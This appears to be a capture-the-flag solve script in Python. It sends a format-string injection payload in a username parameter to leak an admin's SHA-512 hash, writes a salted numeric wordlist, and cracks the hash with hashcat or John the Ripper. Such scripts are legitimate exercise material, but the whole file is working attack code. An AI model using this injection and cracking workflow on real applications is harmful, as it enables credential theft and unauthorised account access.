import requests
import os

# hashcat -m 1700 -a 0 hash password.txt --show

payload = '{passhash.__str__.__globals__[passhash]}'
url = "http://puzzler7.imaginaryctf.org:11005/?username=%s&password=anything" % payload
r = requests.get(url)
output = r.text
hash_start = output.find("user '") + len("user '")
hash_end = output.find("'", hash_start)
admin_hash = output[hash_start:hash_end]
with open("hash", "w") as f:
    f.write(admin_hash)
print(admin_hash)

def create_salt_wordlist():
    with open('wordlist.txt', 'w') as f:
        for i in range(10000000):
            padded_number = str(i).zfill(7)
            salted_string = "very_secure_salt" + padded_number
            f.write(salted_string + "\n")
        print("Created salt wordlist in wordlist.txt")
create_salt_wordlist()

def crack_hash():
    choose_tool = input("""1.Hashcat \n2.John_The_Ripper \nWhat tool do you want to use to crack?: """)
    if choose_tool == "1":
        hashcat = "hashcat -m 1700 -a 0 hash wordlist.txt"
        hashcat_output = os.system(hashcat)
        print(hashcat_output)
    if choose_tool == "2":
        john_the_ripper = "john --format=raw-sha512 --wordlist=wordlist.txt hash"
        john_the_ripper_output = os.system(john_the_ripper)
        print(john_the_ripper_output)
    elif choose_tool != "1" and "2":
        print("Error")
crack_hash()


print("After you get cracked password remove the `very_secure_salt` since it will always contains by default in app and take the numbers behind as password and login with it")
